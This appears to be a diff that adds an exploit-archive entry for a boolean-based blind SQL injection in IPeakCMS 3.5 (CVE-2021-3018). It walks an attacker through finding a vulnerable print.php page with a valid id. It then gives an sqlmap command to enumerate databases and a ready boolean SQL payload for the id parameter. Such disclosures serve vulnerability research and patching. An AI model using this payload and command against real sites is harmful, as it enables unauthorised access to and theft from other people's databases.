@@ -1,0 +1,15 @@
+# Exploit Title: IPeakCMS 3.5 - Boolean-based blind SQLi
+# Date: 07.12.2020
+# Exploit Author: MoeAlbarbari
+# Vendor Homepage: https://ipeak.ch/
+# Software Link: N/A
+# Version: 3.5
+# Tested on: BackBox Linux
+# CVE : CVE-2021-3018
+
+Check the CMS version :goto www.site.com/cms/ and you will notice that in the login box there is the CMS name and its version 
+Check if it's vulnerable, goto ->: site.com/cms/print.php if the print.php exists, then try to find any valid ID which returns page to print  e.g: site.com/cms/print.php?id=1
+Parameter: id (GET based)
+Use SQLmap if you've found the valid id...
+e.g: sqlmap -u "site.com/cms/print.php?id=1" --dbs
+Payload : id=(SELECT (CASE WHEN(3104=3104) THEN 1 ELSE (SELECT 8458) END))
